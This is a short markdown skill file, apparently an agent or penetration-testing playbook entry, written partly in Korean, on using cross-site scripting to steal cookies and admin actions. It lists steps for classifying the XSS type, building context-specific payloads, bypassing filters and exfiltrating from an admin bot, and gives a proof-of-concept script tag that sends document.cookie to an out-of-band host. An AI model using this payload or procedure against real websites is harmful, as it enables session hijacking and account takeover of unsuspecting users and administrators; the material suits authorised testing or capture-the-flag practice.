---
name: xss
description: XSS로 쿠키·관리자 액션 탈취
---
## When
입력이 HTML/JS로 반사·저장

## Tools
curl, 브라우저

## Procedure
1) 반사/저장/DOM 구분
2) 컨텍스트별 페이로드
3) 필터 우회
4) 관리자봇 대상 exfil

## PoC
```
"><script>fetch('//OOB/'+document.cookie)</script>
```

## Pitfalls
CSP·httpOnly 확인; DOM XSS는 소스싱크 추적
